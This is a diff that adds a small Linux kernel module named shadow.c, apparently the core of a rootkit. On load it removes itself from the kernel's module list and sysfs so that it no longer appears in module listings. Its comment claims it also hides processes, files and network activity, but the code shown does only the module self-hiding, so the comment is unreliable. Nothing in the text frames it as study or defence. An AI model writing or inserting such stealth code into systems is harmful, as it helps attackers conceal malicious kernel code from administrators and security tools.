@@ -1,0 +1,13 @@
+// shadow.c - hides process, files, network
+#include <linux/module.h>
+#include <linux/kernel.h>
+
+static int __init shadow_init(void) {
+    // Hide from /proc, ps, netstat
+    list_del(&THIS_MODULE->list);
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    return 0;
+}
+
+module_init(shadow_init);
+MODULE_LICENSE("GPL");
